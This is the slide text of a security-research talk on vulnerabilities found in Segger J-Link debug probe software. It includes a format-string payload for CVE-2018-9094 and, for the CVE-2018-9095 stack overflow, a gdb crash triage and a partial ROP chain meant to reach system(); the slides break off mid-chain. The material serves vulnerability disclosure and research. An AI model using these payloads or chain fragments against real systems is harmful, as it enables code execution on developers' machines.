Somerset Recon
Infecting the Embedded 
Supply Chain
Zach Miller 
Alex Kissinger 
Somerset Recon
Introduction - Who We Are
Zach:
●
Security Researcher @ Somerset Recon
●
Reverse Engineering, Pen Testing
●
Twitter: @bit_twidd1er
Alex:
●
Barista that occasionally does security things @ Somerset Recon
●
Cappuccinos, Hardware Hacking, Reverse Engineering
Somerset Recon
Previous Research - Electronic Safe Lock Analysis
●
Discovered vulnerabilities in the mobile application and wire protocol 
of the SecuRam Prologic B01 Bluetooth electronic safe lock
●
Capture and decode PIN numbers transmitted wirelessly
●
Brute force PIN numbers over the wire
Somerset Recon
Previous Research - Hello Barbie
●
Security analysis on the Mattel Hello Barbie doll
●
Identified several vulnerabilities affecting the device and associated 
web and mobile technologies
Somerset Recon
What do these embedded 
devices have in common???
Somerset Recon
They all utilize embedded 
debuggers for their 
development
Somerset Recon
Where are embedded debuggers used?
Embedded
General Purpose
???
Somerset Recon
Industries That Use Embedded Debuggers 
●
Automotive
●
Industrial
●
Medical
●
Communications
●
Digital Consumer
●
Etc.
Somerset Recon
Our Targets
Somerset Recon
Our Targets
Somerset Recon
Segger J-Link Debug Probe
●
JTAG/SWD/SWO/etc.  
●
In Circuit Emulator (ICE)
●
In Circuit System Programmer (ICSP)
●
Supports ARM/ARM Cortex, RISC-V, RX targets
●
USB and Ethernet
●
Cross platform toolchain 
●
“Ultrafast” download/upload to flash
●
Unlimited  software breakpoints
“SEGGER J-Links are the most widely used line of debug probes available 
today”- www.segger.com 
Somerset Recon
Segger J-Link - Attack Surface
Hardware Debug Probes
○
Runs RTOS
Software Packages that Interact with Debug probes
○
USB Driver
○
Lots of user-mode applications
○
Full-blown IDE
Somerset Recon
Segger J-Link - Hardware
J-Link EDU V9.3
Somerset Recon
Segger J-Link - Hardware
Somerset Recon
Segger J-Link - Hardware
Somerset Recon
Segger J-Link - Hardware
Somerset Recon
Segger J-Link - Hardware
●
Tag-Connect™?
Somerset Recon
Segger J-Link - Debugging a JLink with a JLink
●
Security and Flash bits set in flash
●
Refuses to connect and erase
●
Other ways around this?
Somerset Recon
Segger J-Link - Debugging a JLink with a JLink
●
JLink Mini EDU MCU Reference Manual
●
Chips are cool
Somerset Recon
Vulnerability Research - Reverse Engineering 
●
A lot of cross-compiled code 
●
Some interesting custom string-manipulation stuff (more on this later)
●
A lot of uses of dangerous/banned functions
●
Mostly basic applications, nothing that complicated going on
Somerset Recon
Vulnerability Research - Reverse Engineering 
Analysis of binary protections:
●
DEP/NX enabled
●
ASLR enabled
●
PIE is not enabled
●
No stack canaries in *nix binaries, stack canaries present in Windows
●
SafeSEH used in Windows binaries
●
No Symbols
Somerset Recon
Vulnerability Research - Fuzzing 
Set up fuzzers to test various input vectors
○
Files
○
Network interfaces
○
Command line args
Used peach to do generational fuzzing 
○
A lot of structured, text-based formats
○
A lot of interesting code paths that needed magic numbers to 
reach
Somerset Recon
Vulnerability Research - Fuzzing 
●
Tens of thousands of crashes 
○
Core files everywhere
●
Lots of exploitable crashes
●
...but also tons of duplicate crashes 
●
We had issues keeping J-Link 
devices attached to VMs
Somerset Recon
Vulnerability Research - Fuzzing 
Issues keeping J-Link attached to VM:
●
After a crash the J-Link devices enter a bad state and are disconnected 
from the fuzzing VM
●
We created a crash monitor to trigger on any crash while fuzzing
○
Have the monitor run a script to check if J-Link had fallen off the 
VM 
○
If so, use libvirt to reattach the J-Link if needed
Somerset Recon
Local Exploits
Somerset Recon
CVE-2018-9094 - Format String Vulnerability
● Found interesting custom printf style functions 
implemented in J-Link
Somerset Recon
CVE-2018-9094 - Custom String Formatting
Accepts limited subset of format specifiers
● Accepts basic specifiers: %d, %x, %p, %u, …
● Doesn’t accept the %n family of specifiers
● Accepts precision arguments: .number
Somerset Recon
CVE-2018-9094 - Format String Vulnerability
JFlashSPI_CL.exe -open 
xAAAA%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%
X%X%X%X%X%X%X%s
Somerset Recon
CVE-2018-9094 - Impact
● Lack of %n format specifiers reduces severity of 
this vulnerability
● Potentially could be leveraged as part of an 
exploit chain as a primitive to read arbitrary 
memory
Somerset Recon
CVE-2018-9095 - Discovery
●
Found via fuzzing and made up most of our exploitable crashes (>99%)
●
Traditional stack buffer overflow
●
Reads each line of a file into 512 byte stack buffer
Somerset Recon
CVE-2018-9095 - Triage
$ gdb -c core
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
...
[New LWP 1928]
Core was generated by `JLink_Linux_V630b_i386/JLinkExe -CommandFile payload'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xb7613456 in ?? ()
gdb-peda$ bt
#0  0xb7613456 in ?? ()
#1  0x41414141 in ?? ()
#2  0x4140b609 in ?? ()
#3  0x08048f1c in ?? ()
#4  0x08055813 in ?? ()
#5  0x4140b609 in ?? ()
#6  0x09d17cc0 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
Somerset Recon
CVE-2018-9095 - Exploitation
Steps to exploitation:
1.
Control over return address
2.
Get the address of Libc
3.
Use that to get the address of system()
4.
Call system() with arguments
5.
Bob’s your uncle.
Somerset Recon
CVE-2018-9095 - Triage
1. Control over return address
●
Used GDB Peda to calculate offset
●
Other cool tools (radare2, pwntools,  patter_create.rb)  out there can 
utilize cyclic patterns (De Bruijn sequence) to calculate offsets
Somerset Recon
CVE-2018-9095 - Triage
●
ROP gadgets
○
ROPGadget Tool
■
Grep like a madman
○
Ropper
■
Z3
○
Manually Searching/Custom Tools
○
Bad bytes are bad
Somerset Recon
CVE-2018-9095 - Triage
2. Get the address of Libc
●
Used pwntools to dump all got.plt symbols
●
Search through ROP gadgets for uses
●
ROP gymnastics to dereference it
>>> for x in elf.plt:
...     print x
... 
lseek
malloc
clock_gettime
dlsym
memset
strcat
__libc_start_main
printf
fgets
//Chain pseudo
0x804ae7c: pop esi; pop edi; pop ebp; ret; //esi = **libc
0x0804ae79: mov eax, esi; pop ebx; pop esi; pop edi; pop ebp; ret; //eax = esi, esi = **libc
0x0804d0b3: add eax, dword ptr [eax]; add byte ptr [ebx + 0x5e], bl; pop edi; pop ebp; ret;  //eax += *eax
0x8048e87: sub eax, esi; pop esi; pop edi; pop ebp; ret; //eax -= esi
0x0804b193: add eax, 0x5b000000; pop esi; pop edi; pop ebp; ret; //eax += 0x5b000000, esi = 0x5b000000-off_to_sys
0x8048e87: sub eax, esi; pop esi; pop edi; pop ebp; ret; //eax -= esi
0x08049841: push esi; call eax;
Somerset Recon
3. Use that to get the address of system()
●
The system() function was not called in text, used to the “__libc_start_main” symbol instead
●
GDB to calculate the offsets
●
Lack of gadgets at this point
○
ROP gymnastics to get the proper value in EAX
CVE-2018-9095 - Triage
//Chain pseudo
0x804ae7c: pop esi; pop edi; pop ebp; ret; //esi = **libc
0x0804ae79: mov eax, esi; pop ebx; pop esi; pop edi; pop ebp; ret; //eax = esi, esi = **libc